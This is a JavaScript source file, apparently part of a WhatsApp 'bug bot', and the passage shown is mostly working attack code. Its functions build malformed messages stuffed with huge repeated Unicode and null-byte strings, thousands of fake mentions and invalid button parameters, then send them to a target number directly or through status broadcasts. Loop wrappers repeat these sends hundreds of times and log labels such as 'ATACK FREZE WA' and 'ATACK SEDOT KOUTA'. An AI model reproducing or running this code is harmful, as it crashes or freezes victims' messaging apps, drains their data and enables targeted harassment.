    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  }
}

//---------------( FUNCTION FRZE  )----------------\\
async function JtwFrezeeChat(target) {
    let crash = JSON.stringify({
      action: "x",
      data: "x"
    });
  
    await sock.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "⌁⃰𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "ꦾ".repeat(77777),
      publisher: "⌁⃰𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "Jawa Jawa",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        }
      ],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
     remoteJid: "X",
      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "⌁⃰GHOST PRIDE 🩸" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "⌁⃰⌁⃰𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes To Send Bug To ${target}`));
}


//---------------( FUNCTION UI SISTEM  )----------------\\
async function SystemUi(sock, target) {
  const ZeroInfinity = 'ꦽ'.repeat(20000);
  const SystemUi = '\n'.repeat(5000);

  try {
    const DocumentCrash = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: 9999999999999,
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: SystemUi,
                  fileEncSha256: "+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: ""
                },
              },
            },
            body: {
              text: ZeroInfinity + SystemUi + "ꦽ".repeat(2000) //Jangan ubah yang ZeroInfinity + SystemUi, soalnya itu payload utama
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\n".repeat(1000) },
                { name: "call_permission_request", buttonParamsJson: "\n".repeat(1000) },
                { name: "cta_call", buttonParamsJson: "\n".repeat(1000) },
                { name: "cta_copy", buttonParamsJson: "\n".repeat(1000) },
                { name: "cta_reminder", buttonParamsJson: "\n".repeat(1000) },
                { name: "cta_cancel_reminder", buttonParamsJson: "\n".repeat(1000) },
                { name: "address_message", buttonParamsJson: "\n".repeat(1000) },
                { name: "send_location", buttonParamsJson: "\n".repeat(1000) },
                { name: "quick_reply", buttonParamsJson: "\n".repeat(1000) },
                { name: "mpm", buttonParamsJson: "\n".repeat(1000) },
                { name: "payment_method", buttonParamsJson: "\n".repeat(1000) },
                { name: "account_type", buttonParamsJson: "\n".repeat(1000) },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    header: "ꦽ".repeat(2000),
                    body: "\u0000".repeat(3000),
                    flow_action: "native",
                    flow_action_payload: { screen: "FORM_SCREEN" },
                    flow_cta: "DOCUMENT",
                    flow_id: "1169834181134583",
                    flow_message_version: "3",
                    flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s",
                  }),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "DocumenCrash",
                    url: `https://Wa.me/stickerpack/${ZeroInfinity}`,
                    merchant_url: `https://Wa.me/stickerpack/${ZeroInfinity}`
                  }),
                }
              ],
            },
          },
        },
      },
    };

    const crashMsg = generateWAMessageFromContent(target, DocumentCrash, {});
    await sock.relayMessage(target, crashMsg.message, {
      messageId: crashMsg.key.id,
    });
  } catch (err) {
    console.error("Error:", err);
  }
}
async function clientHard(target) {
  let mention = [];

  for (let i = 0; i < 15; i++) {
    mention.push(
      ...Array.from(
        { length: 1900 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    );
  }

  const msg = {
    viewOnceMessage: {
      message: {
        InteractiveResponseMessage: {
          body: {
            text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request", // galaxy_message
            paramsJson: "\\x5".repeat(10000),
            version: 3,
          },
          InteractiveResponse: {
            participant: target,
            mentionedJid: mention,
            entryPointConversionSource: "call_permission_message",
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
  });

  await new Promise((resolve) => setTimeout(resolve, 1000));

  console.log(chalk.red(`clientHard succesfuly sending bugs`));
}

try {
} catch (err) {
  console.log("error jir:", err);
}

//---------------( FUNCTION DELAY INVIS  )----------------\\
async function ComboX(target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "call_permission_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 126,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "999999")
      }
    );

    const msg1 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 294,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "999999")
      }
    );

    const msg2 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: -6.21462,
              degreesLongitude: 106.84513,
              name: "\u0000".repeat(8888),
              address: "\u0000".repeat(5555),
              contextInfo: {
                mentionedJid: Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 105,
                isForwarded: true
              }
            }
          }
        }
      },
      {}
    );

    const msg3 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    const msg4 = await generateWAMessageFromContent(
      target,
      {
        extendedTextMessage: {
          text: "ꦽ".repeat(20000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      },
      {}
    );

    const msg5 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "GHOST PRIDE 🩸",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(50000) + "ꦾ".repeat(50000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );
    
    const msg6 = await generateWAMessageFromContent(
      target,
      {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 99999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "472649263826373@newsletter",
                  serverMessageId: 1,
                  newsletterName: "Soker Ampas😹"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg4.message, {
      messageId: msg4.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage("status@broadcast", msg5.message, {
      messageId: msg5.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined },
              ],
            },
          ],
        },
      ],
    });
    
    await sock.relayMessage("status@broadcast", msg6.message, {
      messageId: msg6.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error("anjay eror:", err);
  }
}
async function HardFix(sock, target) {
  try {
    const badzz = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "᬴".repeat(5000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(50000),
              version: 3
            },
            contextInfo: {
              participant: target,
              isForwarded: true,
              forwardingScore: 2,
              forwardedNewsletterMessageInfo: {
                newsletterName: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸",
                newsletterJid: "33333333333333333333@newsletter",
                serverMessageId: 1
              },
              conversionSource: "facebook_ads",
              conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
              conversionDelayMs: "9999",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              ]
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, badzz, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error("yah eror:", err);
  }
}


//----------( DELAY HARD )----------\\
async function BetaLey(target) {  
    for (let i = 0; i < 250; i++) {
        try {
            let etc = await generateWAMessageFromContent(  
                target,  
                {  
                    viewOnceMessage: {  
                        message: {  
                            interactiveResponseMessage: {  
                                body: {  
                                    text: "GHOST PRIDE 🩸",  
                                    format: "DEFAULT"  
                                },  
                                nativeFlowResponseMessage: {  
                                    name: "call_permission_request",  
                                    paramsJson: "\u0000".repeat(1045000),  
                                    version: 3  
                                }  
                            }  
                        }  
                    }  
                },  
                {  
                    userJid: target,  
                    quoted: null  
                }  
            );  

            await sock.relayMessage(target, etc.message, {
                participant: {
                    jid: target
                }
            });
        } catch (err) {
            console.error("Error autosync:", err);
        }
    }
};
async function LoraaTLID(target) {
    const Loraa = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "GHOST PRIDE 🩸", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const Sexy = await generateWAMessageFromContent(target, {
  interactiveResponseMessage: {
    body: {
      text: "𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 🩸" + "᬴".repeat(6000)
    },
    nativeFlowResponseMessage: {
      name: "button_reply",
      paramsJson: "{\"id\":\"option_a\"}"
    }
  }
}, {
  ephemeralExpiration: 0,
  forwardingScore: 9741,
  isForwarded: true,
  font: Math.floor(Math.random() * 99999999),
  background: "#" + Math.floor(Math.random() * 16777215)
    .toString(16)
    .padStart(6, "0")
});

    await sock.relayMessage("status@broadcast", Loraa.message, {
        messageId: Loraa.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Sexy.message, {
        messageId: Sexy.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}
async function VisXdelay(target) {  
  try {
    let badzz = await generateWAMessageFromContent(  
      target,  
      {  
        viewOnceMessage: {  
          message: {  
            interactiveResponseMessage: {  
              body: {  
                text: "GHOST PRIDE 🩸" + "꦳".repeat(2000),  
                format: "DEFAULT"  
              },  
              nativeFlowResponseMessage: {  
                name: "call_permission_request",  
                paramsJson: "\u0000".repeat(1040000),  
                version: 3  
              }  
            }  
          }  
        }  
      },  
      {  
        userJid: target,  
        quoted: null  
      }  
    );  

    await sock.relayMessage(target, badzz.message, {
      participant: { jid: target }
    });

  } catch (err) {
    console.error("Error", err);
  }
}
//-----------------------( PEMANGGIL FUNC  )------------------------\\
async function delaybos(target) {
    for (let i = 0; i < 270; i++) {
    await BetaLey(target);
    await sleep(2500);
    await LoraaTLID(target);
    await sleep(2000);
    await VisXdelay(target);
    await sleep(2000);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK DELAY VISIBLE 🩸`));
    }
    }
    
    async function invisible(target) {
    for (let i = 0; i < 300; i++) {
    await ComboX(target);
    await sleep(3000);
    await HardFix(sock, target);
    await sleep(2500);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK DELAY INVISIBLE 🩸`));
    }
    }
    
    async function frezewa(target) {
    for (let i = 0; i < 10; i++) {
    await JtwFrezeeChat(target);
    await sleep(600);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK FREZE WA 🩸`));
    }
    }
    
    
    
    async function blankkkk(target) {
    for (let i = 0; i < 15; i++) {
    await Semesta(target);
    await sleep(400);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK BLANK CLICK 🩸`));
    }
    }
    
        
    
    async function anjing(target) {
    for (let i = 0; i < 30; i++) {
    await StickForclose(target);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK FORCE CLICK 🩸`));
    }
    }
    
    async function uisis(target) {
    for (let i = 0; i < 50; i++) {
    await clientHard(target);
    await sleep(200);
    await SystemUi(sock, target);
    await sleep(700);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄  ATACK UI SISTEM 🩸`));
    }
    }
    
    
    
        
    async function sepong(target) {
    for (let i = 0; i < 120; i++) {
    await MediaInvis(target);
    await sleep(800);
    await tes10(sock, target);
    await sleep(900);
    await newsletterDozzer(sock, target);
    await sleep(900);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK SEDOT KOUTA 🩸`));
    }
    }
    
    
        
    async function notip(target) {
    for (let i = 0; i < 40; i++) {
    await notifblank4(target, ptcp = true);
    await sleep(200);
    await notifblank5(sock, target);
    await sleep(450);
    console.log(chalk.red(`🩸 𝐓𝐖𝐄𝐍𝐓𝐘𝐍𝐈𝐍𝐄 ATACK BLANK NOTIF 🩸`));
    }
    }
    